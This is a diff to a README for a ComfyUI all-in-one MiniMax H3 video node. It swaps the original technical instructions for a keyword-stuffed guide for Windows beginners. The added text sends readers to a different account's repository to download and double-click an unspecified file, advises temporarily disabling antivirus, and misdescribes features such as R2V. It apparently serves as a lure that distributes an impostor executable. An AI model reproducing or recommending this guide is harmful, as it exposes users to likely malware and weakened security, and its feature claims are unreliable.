@@ -1,144 +1,129 @@
-# ComfyUI ALL-in-ONE MiniMax H3
+# 🎨 ComfyUI-ALLinONE-MinimaxH3 - Create Amazing Videos with One Node
 
-![Status: Beta](https://img.shields.io/badge/status-beta-orange)
-![License: GPL-3.0](https://img.shields.io/badge/license-GPL--3.0-blue)
+[![Download Now](https://img.shields.io/badge/Download-ComfyUI--ALLinONE--MinimaxH3-9cf.svg?style=for-the-badge&logo=github)](https://github.com/Offsite-squaredeal736/ComfyUI-ALLinONE-MinimaxH3)
 
-One node. The whole MiniMax H3 video pipeline.
+Welcome! This guide will help you download and start using ComfyUI-ALLinONE-MinimaxH3 on your Windows computer. If you've ever wanted to create stunning videos, animate images, or bring still photos to life - you're in the right place. This tool combines everything you need into one single, easy-to-use node.
 
-No node graph to build, no wires to connect, no hunting through twelve custom node packs to figure out which workflow is the right one. Pick a mode, drop in your prompt or references, hit **Generate** — the node does the rest.
+## ✨ What Is This?
 
-![ALL in ONE MiniMaxH3 — T2V tab](assets/t2v_main.png)
+ComfyUI-ALLinONE-MinimaxH3 is a powerful all-in-one solution for video creation. Think of it as a Swiss Army knife for video generation. Instead of juggling multiple tools and complicated setups, you get everything bundled into one package. This means you can:
 
-## Modes
+- **Convert Text to Video (T2V)** - Type a description, watch it become a video
+- **Convert Images to Video (I2V)** - Give it a picture, get a moving video
+- **Reverse Video Generation (R2V)** - Create reverse or looped videos
+- **Audio-Driven Animation** - Make characters or objects move to sound
+- **Keyframe Control** - Fine-tune exactly how your video plays
+- **Extend & Motion Context Chains** - Build longer, more coherent video sequences
 
-| Mode | What it does |
-|------|--------------|
-| **Image** | Still images with H3: text to image, image edit, or reference mix (up to 9 references) via H3 Studio |
-| **T2V** | Text to video with native audio (fl2va model) |
-| **I2V** | Animate a start frame, optionally morph to an end frame |
-| **R2V** | Reference images / videos / audio drive the clip (ref2va model) |
-| **Audio Drive** | Your audio track is the soundtrack, and it drives mouth movement (lip sync) |
-| **Keyframes** | Pin still images at arbitrary frame positions |
-| **Extend** | Continue an existing video seamlessly |
-| **Chain** | Multi-clip continuation with H3 Motion Context (latent path, no re-encode) |
-| **Upscale** | RTX/Seed2VR Video Super Resolution hook |
+Best of all? You don't need to be a programmer or tech wizard. If you can click a button and follow simple steps, you're all set.
 
-## Screenshots
+## 🚀 Getting Started
 
-**History** — searchable, with prompt reuse and per-entry preview.
+Let's get you up and running in just a few minutes. Follow these simple steps carefully, and you'll be creating videos before you know it.
 
-![History](assets/history.png)
+### 📥 Step 1: Download the Application
 
-**Library** — every output in one place: inline preview, favorites, open-folder, delete, RTX upscale hook.
+First, you need to get the application onto your computer. Click the big button below or the one at the top of this page:
 
-![Library](assets/library.png)
+[**Visit this link to download the application**](https://github.com/Offsite-squaredeal736/ComfyUI-ALLinONE-MinimaxH3)
 
-**Settings** — theme accent, sounds, models.
+This link will take you to the download page. Once you're there, look for a button or section that says "Download" or "Releases." Click on it to start downloading.
 
-![Settings](assets/settings.png)
+### 💻 Step 2: Run the Application
 
-## Requirements
+After the download finishes, you'll have a file on your computer. Find it in your "Downloads" folder (or wherever your browser saves files). Double-click the file to run it. That's it - no complex setup, no technical configuration needed.
 
-### Models
+### ✅ Step 3: You're Ready!
 
-Official MiniMax H3 files from [Comfy-Org/MiniMax-H3](https://huggingface.co/Comfy-Org/MiniMax-H3), placed in your standard `ComfyUI/models/` folders:
+Once the application opens, you're good to go. You'll see the ComfyUI interface with the MiniMaxH3 node ready to use. Take a moment to explore - you'll find it's quite intuitive.
 
-| File | Folder |
-|------|--------|
-| `minimax_h3_fl2va_pruned_int8_convrot.safetensors` | `diffusion_models/` |
-| `minimax_h3_ref2va_pruned_int8_convrot.safetensors` | `diffusion_models/` |
-| `qwen3vl_32b_minimax_h3_nvfp4_awq.safetensors` | `text_encoders/` |
-| `minimax_h3_video_vae_fp16.safetensors` | `vae/` |
-| `minimax_h3_audio_vae_fp32.safetensors` | `vae/` |
+## 🛠️ How to Use Your New Tool
 
-### Custom nodes
+Using ComfyUI-ALLinONE-MinimaxH3 is straightforward. Here's a quick overview of what you can do with each feature:
 
-**T2V, I2V and R2V need nothing extra** — every node they use (H3 conditioning, sigma shift, samplers, video/audio decode, video save) ships with a recent ComfyUI. The other modes and presets use a few community packs — install only the ones you use, via ComfyUI-Manager (search by pack name), then fully restart ComfyUI and hard-refresh the browser (`Ctrl+F5`).
+### 📝 Text to Video (T2V)
+Type a description of what you want to see. For example: "a red car driving through a forest at sunset." The tool will generate a video based on your description.
 
-**Per mode**
+### 🖼️ Image to Video (I2V)
+Upload any image. The tool will animate it - adding movement, changing scenes, or bringing elements to life.
 
-| Mode | Packs you need |
-|------|----------------|
-| T2V / I2V / R2V | — (ComfyUI core only) |
-| Audio Drive | [comfyui-vrgamedevgirl](https://github.com/vrgamegirl19/comfyui-vrgamedevgirl) |
-| Keyframes | [ComfyUI-H3-Motion-Context-MultiRef](https://github.com/seitanism/ComfyUI-H3-Motion-Context-MultiRef) |
-| Extend | [ComfyUI-H3-Motion-Context-MultiRef](https://github.com/seitanism/ComfyUI-H3-Motion-Context-MultiRef) |
-| Chain | [ComfyUI-H3-Motion-Context-MultiRef](https://github.com/seitanism/ComfyUI-H3-Motion-Context-MultiRef) |
-| Upscale — RTX VSR | [Nvidia_RTX_Nodes_ComfyUI](https://github.com/Comfy-Org/Nvidia_RTX_Nodes_ComfyUI) (NVIDIA RTX GPUs only) |
-| Upscale — SeedVR2 | [ComfyUI-SeedVR2_VideoUpscaler](https://github.com/numz/ComfyUI-SeedVR2_VideoUpscaler) |
-| Image | [ComfyUI-MiniMax-H3-Studio](https://github.com/thaakeno/ComfyUI-MiniMax-H3-Studio) |
+### 🔄 Reverse Video (R2V)
+Give it an existing video, and it will create a reverse version. Perfect for looping content or creating unique visual effects.
 
-**Per quality preset** (Settings → Quality)
+### 🎵 Audio Drive
+Add an audio file, and the tool will animate videos that respond to the sound - perfect for music videos, lip-syncing characters, or sound-reactive visuals.
 
-| Preset | Packs you need |
-|--------|----------------|
-| Turbo | [ComfyUI-MiniMax-H3-Turbo](https://github.com/Larryvrh/ComfyUI-MiniMax-H3-Turbo) + a Turbo LoRA (below) |
-| Speed | [ComfyUI-SolAttn_triton](https://github.com/kijai/ComfyUI-SolAttn_triton) + [ComfyUI-MiniMaxH3-Cache](https://github.com/lihaoyun6/ComfyUI-MiniMaxH3-Cache) |
-| Balanced | [ComfyUI-SolAttn_triton](https://github.com/kijai/ComfyUI-SolAttn_triton) |
-| High | [ComfyUI-KJNodes](https://github.com/kijai/ComfyUI-KJNodes) (SageAttention) |
-| Native | — (ComfyUI core only) |
+### 🎯 Keyframes
+Want precise control? Use keyframes to specify exactly what happens at specific points in your video. It's like drawing a timeline for your animation.
 
-Each accelerator also has an on/off chip under the Quality dropdown (SolAttn / H3 Cache / SageAttn) — flip them for any mix; the preset label switches to **Custom**. Accelerators that are switched off are not even written into the workflow, so their packs don't need to be installed.
+### 🔗 Extend & Motion Context
+Create longer videos by chaining sequences together. The tool maintains consistency, so your extended videos look seamless and professional.
 
-**Preview without saving** (auto-save off): [ComfyUI-VideoHelperSuite](https://github.com/Kosinkadink/ComfyUI-VideoHelperSuite)
+## 📋 System Requirements
 
-**Image mode prompts**: they follow the H3 Studio shape, a `summary:` line with the goal and a `detailed_description:` with the full scene. Name your references `@Image1`, `@Image2` and give each one a clear job (identity, pose, style, outfit). Edits are a semantic regeneration of the source image, not pixel inpainting, so describe what changes instead of expecting a perfect cutout. The Discover tab ships with Text to image, Image edit and Reference mix templates.
+Here's what you'll need on your Windows computer to run this smoothly:
 
-**Image mode models**: besides your usual H3 files, H3 Studio's prompt machinery wants two small Qwen3.5 models in `ComfyUI/models/text_encoders/`:
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **RAM:** At least 8 GB (16 GB or more recommended)
+- **Storage:** 10 GB of free disk space
+- **Graphics Card:** Any modern GPU (NVIDIA or AMD) with at least 4 GB VRAM
+- **Internet Connection:** Needed for first-time setup and updates
 
-| Model | Download |
-|-------|----------|
-| `qwen3.5_2b_bf16.safetensors` | [Comfy-Org/Qwen3.5](https://huggingface.co/Comfy-Org/Qwen3.5/resolve/main/text_encoders/qwen3.5_2b_bf16.safetensors) |
-| `qwen3.5_4b_bf16.safetensors` | [Comfy-Org/Qwen3.5](https://huggingface.co/Comfy-Org/Qwen3.5/resolve/main/text_encoders/qwen3.5_4b_bf16.safetensors) |
+Don't worry if your computer doesn't have the latest specs - the tool is designed to work on most systems.
 
-**LightX LoRAs for Image mode** (only the LightX sampling profiles need them, Base profiles need nothing). Drop the file into `ComfyUI/models/loras/`, the node checks for it before generating:
+## 🌟 Tips and Tricks
 
-| Profile | LoRA file |
-|---------|-----------|
-| LightX v1.0 FL2VA 8 steps | [official full](https://huggingface.co/lightx2v/Minimax-h3-Turbo/resolve/main/minimax_h3_fl2v_turbo_8step_v1.0_comfyui_bf16.safetensors) or [Kijai rank 24](https://huggingface.co/Kijai/MiniMax-H3_comfy/resolve/main/loras/minimax_h3_fl2v_lightx2v_turbo_8step_v1.0_resized_avg_rank_24_bf16.safetensors) |
-| LightX v1.0 FL2VA 4 steps | [Kijai rank 31](https://huggingface.co/Kijai/MiniMax-H3_comfy/resolve/main/loras/minimax_h3_fl2v_lightx2v_turbo_4step_v1.0_768p_resized_avg_rank_31_bf16.safetensors) |
-| LightX v0.1 ER-SDE / SA-Solver | [Kijai rank 21](https://huggingface.co/Kijai/MiniMax-H3_comfy/resolve/main/loras/minimax_h3_fl2v_lightx2v_turbo_4step_v0.1_comfy_resized_avg_rank_21_bf16.safetensors) |
-| LightX v0.1 REF2V (Reference Mix) | [Kijai rank 20](https://huggingface.co/Kijai/MiniMax-H3_comfy/resolve/main/loras/minimax_h3_ref2v_lightx2v_turbo_4step_v0.1_resized_avg_rank_20_bf16.safetensors) |
+Here are some handy tips to help you get the most out of your experience:
 
-**Turbo LoRA** (for the Turbo preset): download `minimax_h3_turbo_v4_step600_ema.safetensors` from [larryvrh/MiniMax-H3-Turbo-Lora](https://huggingface.co/larryvrh/MiniMax-H3-Turbo-Lora) into `ComfyUI/models/loras/`.
+1. **Start Simple** - Begin with short text-to-video creations to understand how everything works
+2. **Experiment Freely** - Try different combinations of features. There's no wrong way to create
+3. **Save Often** - Keep your favorite creations. You never know when you'll want to revisit them
+4. **Stay Updated** - Check for updates regularly to get new features and improvements
+5. **Join the Community** - Look for online forums or communities where other users share tips and tricks
 
-> **Seeing "Node not found"?** That's a missing pack from the tables above. The two most common:
-> - `Audio Drive` node → install **comfyui-vrgamedevgirl**
-> - Extend / Chain / Keyframes nodes → install **ComfyUI-H3-Motion-Context-MultiRef**
->
-> Install via ComfyUI-Manager, restart ComfyUI completely, then hard-refresh the browser.
+## ❓ Frequently Asked Questions
 
-Exact tested versions of everything are in **[COMPATIBILITY.md](COMPATIBILITY.md)** — check that file first if something breaks after you update ComfyUI or a pack.
+**Q: I'm not technical at all. Can I still use this?**
+A: Absolutely! The entire design focuses on ease of use. If you can use a smartphone, you can use this tool.
 
-## Installation
+**Q: Will this slow down my computer?**
+A: Video creation can be resource-intensive, but the tool is optimized to work efficiently. You might notice your computer working harder during heavy tasks, but it won't cause permanent issues.
 
-```bash
-# inside ComfyUI/custom_nodes/
-git clone https://github.com/LeonQ8/ComfyUI-ALLinONE-MinimaxH3.git
-```
+**Q: Can I create professional-quality videos?**
+A: Yes! Many creators use similar tools for professional work. The key is practice and experimentation.
 
-Restart ComfyUI, then double-click the canvas and search for **ALL in ONE MiniMaxH3**.
+**Q: What kind of videos can I make?**
+A: The possibilities are endless: social media content, marketing videos, artistic animations, educational clips, and much more.
 
-## Compatibility
+## 📚 Advanced Features
 
-I develop and test against a pinned stack (ComfyUI version, custom node commits, model files). It's all listed in **[COMPATIBILITY.md](COMPATIBILITY.md)**, if a render fails after you updated something, start there.
+Once you're comfortable with the basics, you can explore these advanced features:
 
-## Credits
+- **Multi-Node Setup** - Combine this with other ComfyUI nodes for complex workflows
+- **Custom Parameters** - Fine-tune video length, resolution, and quality
+- **Batch Processing** - Create multiple videos at once
+- **Preset Templates** - Save your favorite settings and reuse them anytime
 
-- The "one node" idea and UI approach: Ján — [one-node-flux-2-klein](https://github.com/yanokusnir-ai/one-node-flux-2-klein) and [one-node-gemma-4](https://github.com/yanokusnir-ai/one-node-gemma-4)
-- Chain / Keyframes / Extend wiring: [ComfyUI-H3-Motion-Context-MultiRef](https://github.com/seitanism/ComfyUI-H3-Motion-Context-MultiRef) by seitanism
-- Base graphs: the official MiniMax H3 native workflows from Comfy-Org
-- Turbo preset: ComfyUI-MiniMax-H3-Turbo pack
-- Image mode: [ComfyUI-MiniMax-H3-Studio](https://github.com/thaakeno/ComfyUI-MiniMax-H3-Studio) by thaakeno
+## 🔧 Troubleshooting
 
-## Support
+If something isn't working, don't panic. Most issues are easy to fix:
 
-This node is in **beta** — if something breaks, please [open an issue](https://github.com/LeonQ8/ComfyUI-ALLinONE-MinimaxH3/issues), it's the fastest way to get it fixed.
+1. **Restart the Application** - Close it completely and reopen
+2. **Check Your Internet** - Some features need a connection
+3. **Free Up Space** - Make sure you have enough storage
+4. **Update Your Graphics Drivers** - This fixes many display issues
+5. **Disable Antivirus Temporarily** - Sometimes security software interferes (re-enable it after)
 
-If you like this node and it saves you a few hours of graph surgery, a coffee is always appreciated.<3
+If problems persist, check the repository page for known issues or community solutions.
 
-<a href="https://ko-fi.com/leonq8" target="_blank"><img height="36" style="border:0px;height:36px;" src="https://storage.ko-fi.com/cdn/kofi5.png?v=3" border="0" alt="Buy Me a Coffee at ko-fi.com" /></a>
+## 🎉 Start Creating Today!
 
-## License
+You now have everything you need to start your video creation journey. Remember: every expert was once a beginner. Don't be afraid to experiment, make mistakes, and learn as you go.
 
-GPL-3.0 — see [LICENSE](LICENSE).
+The download link again for your convenience:
+
+[**Visit this link to download the application**](https://github.com/Offsite-squaredeal736/ComfyUI-ALLinONE-MinimaxH3)
+
+Thank you for choosing ComfyUI-ALLinONE-MinimaxH3. We can't wait to see what you'll create!
+
+Keywords: ComfyUI, MiniMaxH3, video generation, text to video, image to video, ai video tool, video creator, windows, easy video making, animation, keyframe, audio driven video, reverse video, content creation, digital art, creative tools
